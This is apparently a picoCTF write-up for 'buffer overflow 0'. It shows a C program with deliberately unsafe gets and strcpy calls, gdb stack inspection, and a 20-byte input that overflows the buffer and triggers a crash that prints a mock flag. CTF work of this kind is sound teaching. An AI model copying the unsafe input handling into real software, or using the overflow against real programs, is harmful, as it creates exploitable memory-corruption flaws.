# picoCTF buffer overflow 0

This is the 'buffer overflow 0' level from picoCTF. It can be found here, along with the binary source code. 

Let's take a look at the code first:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler

  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

After the validation for the 'flag.txt' file, there's this line `signal(SIGSEGV, sigsev_handler);i` which will call the 'sigsegv_handler' if the signal 'SIGSEGV' is received. 

This function is the one in charge of printing the flag.

So, we basically need to get a 'SIGSEGV' to occur, and we'll get the flag. 

Let's see what else the process is doing. 

We see that it's capturing our input with the `gets(buf1)` line, and then pass that value into vuln.

If we look the 'gets' man page, it says:
*DESCRIPTION*
Never use this function.

The issue with 'gets' is that you can tell how many characters it'll read, creating the perfect scenario for a buffer overflow vulnerability. 

So, we have a buffer for 'buf1' of 100 bytes, and then we're calling gets, allowing the user to send as many chars as wanted.

The program should be using "fgets" instad, where you can specify how many chars you want to read. 

After this, it calls the 'vuln' function, where it'll copy our input, into a 16 bytes variable 'buf2'. 

Let's put a breakpoint right after the call to 'gets', to see what's on the stack.
```
gdb ./vuln
(gdb) b *main+230
run
```
It prompts for an input, so let's do "AAAA". And then continue until the breakpoint right after the gets:
```C
  0x56556463 <main+00e1>      call   0x56556130 <gets@plt>
→ 0x56556468 <main+00e6>      add    esp, 0x10
```
If we inspect the stack with `x/20wx $esp`, we can see the 20 words at the stack. (ESP is the stack pointer for 32 bits).

```
gef➤  x/20wx $esp
0xffffce80:     0xffffce94      0x000003e8      0x000003e8      0x5655641f
0xffffce90:     0x00000000      0x41414141      0x00000000      0xf7ffd000
0xffffcea0:     0xf7fc4540      0xffffffff      0x56555034      0xf7fc66d0
0xffffceb0:     0xf7ffd608      0x0000000c      0xffffcf1c      0xffffd0d8
0xffffcec0:     0x00000000      0x00000000      0x01000000      0x0000000c
```

At `0xffffce94` we see the 4 'A' we input. And at `0xffffcea8` is the return address (an address that points to where to come back, in this case, an address in main). 

So. If the substract the address of the start of our input from the address that contains the return value, we have 
`0xffffcea8 - 0xffffce94 = 0x14` which is 20 bytes. 

So. If we input 20 bytes of data, we can overwrite the return address, causing this way a SIGSEGV signal. 

Let's try it by running once again the program, but with this new information. 

```
mfumega@pwn-boy:/tmp/here$ ./vuln
Input: AAAAAAAAAAAAAAAAAAAA
mock{This_is_a_mock_flag}
```

And we got the local flag. We can do the same agaisnt the remote process, and get the flag aswell. 


